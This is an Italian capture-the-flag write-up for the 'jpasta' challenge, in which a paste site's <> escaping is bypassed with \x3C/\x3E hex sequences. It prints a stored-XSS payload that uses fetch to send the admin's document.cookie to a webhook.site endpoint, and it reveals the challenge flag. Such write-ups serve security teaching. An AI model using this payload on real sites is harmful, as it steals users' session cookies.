# Writeup: WS_3.07 - jpasta

## Descrizione 📝
Il sito **jpasta** permette di creare e condividere paste, e l’admin visita periodicamente queste paste. L’obiettivo è ottenere la **flag** presente nel cookie dell’admin, ma quando proviamo a inserire codice come `<script>alert(1)</script>`, i caratteri `<` e `>` vengono convertiti in `&lt;` e `&gt;`, impedendo l’esecuzione di JavaScript.  

Tuttavia, il filtro non intercetta le sequenze di escape esadecimali `\x3C` (equivalente a `<`) e `\x3E` (equivalente a `>`). Possiamo quindi usarle per aggirare il filtro e inserire codice JavaScript che verrà eseguito quando l’admin visualizza la nostra paste.

## Sfruttamento 🎯

1. **Analisi del Filtro**  
   - Se scriviamo `<script>`, diventa `&lt;script&gt;`.  
   - Se usiamo `\x3Cscript\x3E`, il server non converte queste sequenze esadecimali, lasciandole intatte.  
   - In questo modo, possiamo ricreare `<script>` e `</script>` nonostante il filtro.

2. **Creazione del Payload**  
   Per estrarre la flag (o il cookie dell’admin), inseriamo un JavaScript che effettua un `fetch` verso un nostro endpoint (es. su Webhook.site). Ad esempio:  
   ```html
   \x3Cscript\x3Efetch('https://webhook.site/ID?cookie='+document.cookie)\x3C/script\x3E
   ```
   In questo modo, quando l’admin carica la paste, il codice verrà eseguito e il cookie (che contiene la flag) ci verrà inviato.

3. **Invio del Payload**  
   - Creiamo una nuova paste o cerchiamo un campo di input dove il sito riflette il nostro testo.  
   - Incolliamo il payload in esadecimale.  
   - Il sito sostituirà i normali `<` e `>` ma non i `\x3C` e `\x3E`.  
   - L’admin, aprendo la paste, eseguirà lo script.

4. **Raccolta della Flag**  
   Andando sul nostro endpoint (ad esempio, su Webhook.site), troveremo la richiesta con `?cookie=<valore>` o direttamente la flag. Nel log di Webhook.site leggeremo la flag.

## Risultato 🏁
Alla fine, la flag recuperata è qualcosa del tipo:
```
CCIT{f736c0e5df335092f93fe999377c766d?}
```

## Lezioni Apprese 📚
1. **Bypass Filtri HTML**: Se `<` e `>` vengono sostituiti, possiamo ricorrere a notazioni alternative come `\x3C` e `\x3E`.  
2. **XSS Riflesso**: Anche un filtro semplice può essere aggirato usando encoding non standard.  
3. **Webhook**: Uno strumento pratico per ricevere informazioni sensibili (come cookie) esfiltrate tramite XSS.

## Tools Utilizzati 🛠️
- **Browser**: Per testare la paste e vedere come il server filtra i caratteri.  
- **Webhook.site**: Per intercettare il cookie dell’admin.  
- **Editor di Testo**: Per preparare il payload con le sequenze `\x3C` e `\x3E`.

---

*Writeup by Luca Crippa - Last Updated: 2024*
